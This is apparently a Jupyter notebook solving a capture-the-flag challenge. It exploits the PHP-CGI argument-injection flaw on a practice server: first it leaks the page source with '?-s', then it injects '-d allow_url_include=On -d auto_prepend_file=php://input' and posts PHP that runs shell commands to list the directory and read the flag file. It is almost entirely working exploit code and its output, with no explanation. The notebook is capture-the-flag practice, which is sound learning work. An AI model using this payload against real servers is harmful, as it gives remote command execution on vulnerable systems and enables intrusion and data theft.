{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import urllib\n",
    "from bs4 import BeautifulSoup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html><body><code><span style=\"color: #000000\">\n",
      "<span style=\"color: #0000BB\">&lt;?php<br/><br/>    </span><span style=\"color: #FF8000\">//  Flag is in this directory.<br/><br/>    </span><span style=\"color: #0000BB\">date_default_timezone_set</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">'UTC'</span><span style=\"color: #007700\">);<br/>    <br/>    </span><span style=\"color: #0000BB\">$t </span><span style=\"color: #007700\">= </span><span style=\"color: #DD0000\">'2012:1823:20:'</span><span style=\"color: #007700\">;<br/>    </span><span style=\"color: #0000BB\">$t </span><span style=\"color: #007700\">.= </span><span style=\"color: #0000BB\">date</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">'y:m:d:H:i:s'</span><span style=\"color: #007700\">);<br/>    for(</span><span style=\"color: #0000BB\">$i</span><span style=\"color: #007700\">=</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">;</span><span style=\"color: #0000BB\">$i</span><span style=\"color: #007700\">&lt;</span><span style=\"color: #0000BB\">4</span><span style=\"color: #007700\">;</span><span style=\"color: #0000BB\">$i</span><span style=\"color: #007700\">++)<br/>        </span><span style=\"color: #0000BB\">$t </span><span style=\"color: #007700\">.= </span><span style=\"color: #0000BB\">sprintf</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">':%02d'</span><span style=\"color: #007700\">,</span><span style=\"color: #0000BB\">mt_rand</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">,</span><span style=\"color: #0000BB\">59</span><span style=\"color: #007700\">));<br/></span><span style=\"color: #0000BB\">?&gt;<br/></span>&lt;!DOCTYPE html&gt;<br/>&lt;html&gt;<br/>  &lt;head&gt;<br/>    &lt;meta charset=\"utf-8\"&gt;<br/>    &lt;title&gt;Clock&lt;/title&gt;<br/>    &lt;style&gt;<br/>      body<br/>      {<br/>        background: black;<br/>      }<br/>      p<br/>      {<br/>        color: red;<br/>        font-size: xx-large;<br/>        font-weight: bold;<br/>        text-align: center;<br/>        margin-top: 200px;<br/>      }<br/>    &lt;/style&gt;<br/>  &lt;/head&gt;<br/>  &lt;body&gt;<br/>    &lt;p&gt;<span style=\"color: #0000BB\">&lt;?php </span><span style=\"color: #007700\">echo </span><span style=\"color: #0000BB\">$t</span><span style=\"color: #007700\">; </span><span style=\"color: #0000BB\">?&gt;</span>&lt;/p&gt;<br/>  &lt;/body&gt;<br/>&lt;/html&gt;<br/></span>\n",
      "</code></body></html>\n"
     ]
    }
   ],
   "source": [
    "url = \"http://ctfq.sweetduet.info:10080/~q12/?-s\"\n",
    "r = requests.post(url, data=data)\n",
    "soup = BeautifulSoup(r.content, 'lxml')\n",
    "print(soup)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "hex(ord('='))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 18668\n",
      "dr-x--x--x 2 q12  q12      4096 Feb 22 19:20 .\n",
      "drwx--x--x 3 root root     4096 Feb 22 19:20 ..\n",
      "-r--r--r-- 1 q12  q12        90 Feb 22 19:20 .htaccess\n",
      "-r-------- 1 q12  q12        22 Feb 22 19:20 flag_flag_flag.txt\n",
      "-r-xr-xr-x 1 q12  q12       600 Feb 22 19:20 index.php\n",
      "-r-xr-xr-x 1 q12  q12  19093315 Feb 22 19:20 php.cgi\n",
      "<!DOCTYPE html>\n",
      "<html>\n",
      "  <head>\n",
      "    <meta charset=\"utf-8\">\n",
      "    <title>Clock</title>\n",
      "    <style>\n",
      "      body\n",
      "      {\n",
      "        background: black;\n",
      "      }\n",
      "      p\n",
      "      {\n",
      "        color: red;\n",
      "        font-size: xx-large;\n",
      "        font-weight: bold;\n",
      "        text-align: center;\n",
      "        margin-top: 200px;\n",
      "      }\n",
      "    </style>\n",
      "  </head>\n",
      "  <body>\n",
      "    <p>2012:1823:20:20:02:22:10:22:19:30:32:56:30</p>\n",
      "  </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "url = \"http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input\"\n",
    "data = \"<?php system('ls -al'); ?>\"\n",
    "r = requests.post(url, data=data)\n",
    "print(r.content.decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FLAG_ZysbiGgbHrN3f9zs\n",
      "<!DOCTYPE html>\n",
      "<html>\n",
      "  <head>\n",
      "    <meta charset=\"utf-8\">\n",
      "    <title>Clock</title>\n",
      "    <style>\n",
      "      body\n",
      "      {\n",
      "        background: black;\n",
      "      }\n",
      "      p\n",
      "      {\n",
      "        color: red;\n",
      "        font-size: xx-large;\n",
      "        font-weight: bold;\n",
      "        text-align: center;\n",
      "        margin-top: 200px;\n",
      "      }\n",
      "    </style>\n",
      "  </head>\n",
      "  <body>\n",
      "    <p>2012:1823:20:20:02:22:10:22:38:37:13:23:09</p>\n",
      "  </body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "url = \"http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input\"\n",
    "data = \"<?php system('cat flag_flag_flag.txt'); ?>\"\n",
    "r = requests.post(url, data=data)\n",
    "print(r.content.decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
